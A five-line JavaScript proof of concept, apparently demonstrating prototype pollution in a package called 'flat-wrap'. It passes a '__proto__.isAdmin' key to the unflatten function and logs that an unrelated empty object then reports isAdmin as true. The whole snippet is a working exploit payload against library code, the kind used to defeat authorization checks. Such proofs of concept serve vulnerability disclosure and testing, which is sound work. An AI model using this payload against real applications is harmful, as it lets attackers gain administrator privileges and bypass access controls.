const flat = require('flat-wrap');
a = {};
console.log(a.isAdmin);
flat.unflatten({ '__proto__.isAdmin': true });
console.log(a.isAdmin);